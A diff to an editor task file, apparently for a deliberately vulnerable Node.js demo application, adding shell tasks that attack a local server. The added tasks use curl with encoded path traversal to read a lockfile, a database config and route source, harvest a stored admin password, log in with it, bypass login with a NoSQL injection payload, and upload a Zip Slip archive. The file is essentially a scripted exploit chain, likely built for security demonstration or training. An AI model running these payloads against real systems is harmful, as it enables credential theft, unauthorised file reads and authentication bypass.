@@ -31,7 +31,37 @@
             "dependsOn": ["PRE-003 Run MongoDB"]
         },
         {
-            "label": "EXP-001 Zip Slip Exploit",
+            "label": "DT-001 Get adm-zip version",
+            "type": "shell",
+            "command": "curl http://localhost:3001/public/%2e%2e/package-lock.json | jq '.dependencies[\"adm-zip\"]'"
+        },
+        {
+            "label": "DT-002a Try /login with incorrect password",
+            "type": "shell",
+            "command": "curl -o /dev/null -s -w \"HTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":\"wrong\"}'"
+        },
+        {
+            "label": "DT-002b Discover Mongo creds",
+            "type": "shell",
+            "command": "curl http://localhost:3001/public/%2e%2e/mongoose-db.js | grep -E \"(mongoUri|username.*password)\""
+        },
+        {
+            "label": "DT-002c Try /login with harvested password",
+            "type": "shell",
+            "command": "curl -o /dev/null -s -w \"HTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":\"SuperSecretPassword\"}'"
+        },
+        {
+            "label": "DT-003a Harvest routes/index.js",
+            "type": "shell",
+            "command": "curl http://localhost:3001/public/%2e%2e/routes/index.js"
+        },
+        {
+            "label": "DT-003b NoSQL injection login bypass",
+            "type": "shell",
+            "command": "curl -s -w \"\\nHTTP Status: %{http_code}\\n\" -X POST http://localhost:3001/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin@snyk.io\",\"password\":{\"$ne\":null}}'"
+        },
+        {
+            "label": "ZS-001 Zip Slip Exploit",
             "type": "shell",
             "command": "curl -X POST http://localhost:3001/import -F 'importFile=@/workspaces/node-gva/exploits/demo/01-adm-zip-slip/malicious_workspace.zip'"
         }
